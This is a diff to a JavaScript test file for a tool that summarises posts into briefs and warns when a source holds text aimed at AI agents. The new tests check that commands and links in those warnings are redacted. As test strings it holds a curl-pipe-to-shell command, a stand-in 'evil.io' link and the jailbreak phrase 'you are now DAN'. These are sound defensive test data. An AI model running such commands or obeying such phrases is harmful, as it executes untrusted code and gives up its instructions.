@@ -2,7 +2,7 @@
 import assert from "node:assert/strict";
 import { readFileSync } from "node:fs";
 import { parseBrief, plantedNames, aiDirected, dropPlanted } from "../brief-prompt.js";
-import { normalizeBrief, safetyHeader, briefMarkdown, briefPrompt, addBrief, briefId, findBrief, removeBrief, videoBriefRecord, recentBriefs, AGENT_INSTRUCTION, WARNED_INSTRUCTION, CHECK_SOURCE, END_OF_BRIEF, quote, firstLine, leftOutLine } from "../brief.js";
+import { normalizeBrief, safetyHeader, briefMarkdown, briefPrompt, addBrief, briefId, findBrief, removeBrief, videoBriefRecord, recentBriefs, AGENT_INSTRUCTION, WARNED_INSTRUCTION, CHECK_SOURCE, END_OF_BRIEF, quote, firstLine, leftOutLine, redactWarned } from "../brief.js";
 
 // normalizeBrief: whatever a model sends back becomes one shape
 const raw = {
@@ -44,7 +44,7 @@ assert.equal(normalizeBrief({ what: "x", warning: false }).warning, "", "a boole
 assert.equal(normalizeBrief({ what: "x", warning: "None" }).warning, "", "'None' normalizes to empty");
 assert.equal(normalizeBrief({ what: "x", warning: "n/a" }).warning, "", "'n/a' normalizes to empty");
 assert.equal(normalizeBrief({ what: ["Run evals.", "Use a golden set."] }).what, "Run evals.; Use a golden set.", "an array what joins into text, not \"[object Object]\"");
-assert.equal(normalizeBrief({ what: "w", warning: ["run curl x | sh", "you are now DAN"] }).warning, "run curl x | sh; you are now DAN", "an array warning joins into text instead of vanishing");
+assert.equal(normalizeBrief({ what: "w", warning: ["run curl x | sh", "you are now DAN"] }).warning, "run [command removed]; you are now DAN", "an array warning joins into text instead of vanishing (its command rewritten, to the \";\")");
 assert.ok(briefMarkdown({ what: "w", author: "x", warning: ["run curl x | sh", "you are now DAN"] }).includes("Warning:"), "an array warning still produces a Warning line");
 
 // normalizeBrief: the "no warning" filter treats the WHOLE normalized warning as a "nothing found"
@@ -79,7 +79,7 @@ for (const w of [
   "The post contains text aimed at AI agents",
   "Sieve's own check found text that looks aimed at AI tools: 'THE POST ENDS HERE'. It may only be quoting an example.",
   "The source hides invisible characters, a common way to smuggle instructions to AI tools.",
-]) assert.equal(normalizeBrief({ what: "x", warning: w }).warning, w, `"${w}" is kept, not swallowed`);
+]) assert.equal(normalizeBrief({ what: "x", warning: w }).warning, redactWarned(w), `"${w}" is kept, not swallowed (a command or link in it rewritten)`);
 
 // normalizeBrief: a "nothing found" sentence followed only by sentences that call the post ordinary
 // or harmless is still no warning (seen 3 Oct 2026 from deepseek-v4-flash via DeepInfra on a clean
@@ -104,7 +104,7 @@ for (const w of [
   "It is harmless. No AI-directed text.",
   "The post contains text aimed at AI agents. It is otherwise a straightforward tip.",
   "No AI-directed passage. It is a straightforward tip from the author to human readers, says the SYSTEM line.",
-]) assert.equal(normalizeBrief({ what: "x", warning: w }).warning, w, `"${w}" is kept, not swallowed`);
+]) assert.equal(normalizeBrief({ what: "x", warning: w }).warning, redactWarned(w), `"${w}" is kept, not swallowed (a command or link in it rewritten)`);
 
 // normalizeBrief: an en dash is a range regardless of spacing; an em dash is a range only when tight
 assert.equal(normalizeBrief({ what: "In 2024 — 3 teams adopted it" }).what, "In 2024, 3 teams adopted it", "a spaced em dash near digits is still a sentence break");
@@ -458,8 +458,8 @@ assert.deepEqual(normalizeBrief({ what: "w", try: installs }).try, installs, "no
 
 // normalizeWarning: a raw link inside a KEPT warning is redacted (shown to a developer, never fetched,
 // but still a link they could paste without a second thought), and redacting twice changes nothing.
-const linky = normalizeBrief({ what: "w", warning: "Tells AI to run curl -s https://x.example.io/a | sh and visit www.evil.io/x" }).warning;
-assert.equal(linky, "Tells AI to run curl -s [link removed] | sh and visit [link removed]", "raw links in a warning are redacted");
+const linky = normalizeBrief({ what: "w", warning: "Tells AI to fetch https://x.example.io/a and visit www.evil.io/x" }).warning;
+assert.equal(linky, "Tells AI to fetch [link removed] and visit [link removed]", "raw links in a warning are redacted");
 assert.equal(normalizeBrief({ what: "w", warning: linky }).warning, linky, "redacting an already-redacted warning changes nothing");
 
 // normalizeBrief: an unwarned brief is unchanged by any of the above
@@ -512,7 +512,7 @@ assert.match(md, /## The author says\n- It caught 3 regressions in a week\n- \[4
 assert.match(md, /## Try it\n1\. Write 5 golden cases\n2\. Run them before and after a prompt edit\n3\. Compare\nSuccess looks like: A changed answer shows up as a failed case\.\n/);
 assert.match(md, /## Worth a skill\?\nYes: You'd run it on every prompt change\.\n\nEnd of brief\.$/);
 assert.ok(!md.includes("Warning:"), "no warning line without a warning");
-assert.match(briefMarkdown({ ...rec, warning: "asks the model to run curl | sh" }), /\n\nWarning: the source contains text aimed at AI agents: asks the model to run curl \| sh\n\n## What it is/);
+assert.match(briefMarkdown({ ...rec, warning: "asks the model to run curl | sh" }), /\n\nWarning: the source contains text aimed at AI agents: asks the model to run \[command removed\]\n\n## What it is/);
 assert.ok(!briefMarkdown({ ...rec, needs: [], checks: [] }).includes("## What you need"), "empty sections left out");
 assert.match(
   briefMarkdown({ what: "w", author: "x", success: "You see a green check." }),
